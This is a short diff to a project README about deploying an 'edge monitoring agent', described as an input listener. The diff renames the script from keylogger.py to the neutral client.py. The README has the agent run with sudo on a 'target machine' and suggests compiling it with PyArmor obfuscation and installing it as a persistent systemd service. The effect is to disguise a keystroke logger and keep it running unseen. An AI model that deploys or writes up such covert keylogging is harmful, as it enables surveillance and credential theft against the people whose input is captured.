@@ -77,7 +77,7 @@ streamlit run dashboard.py
 ### 3. Deploy the Edge Monitoring Agent
 Execute the input listener agent on the target machine utilizing hardware access privileges:
 ```bash
-sudo env "PATH=$PATH" python3 keylogger.py
+sudo env "PATH=$PATH" python3 client.py
 ```
 *To run this persistently in production environments, compile the agent using **PyInstaller / PyArmor** and configure it as a native background daemon system loop (`/etc/systemd/system/argus.service`).*
 
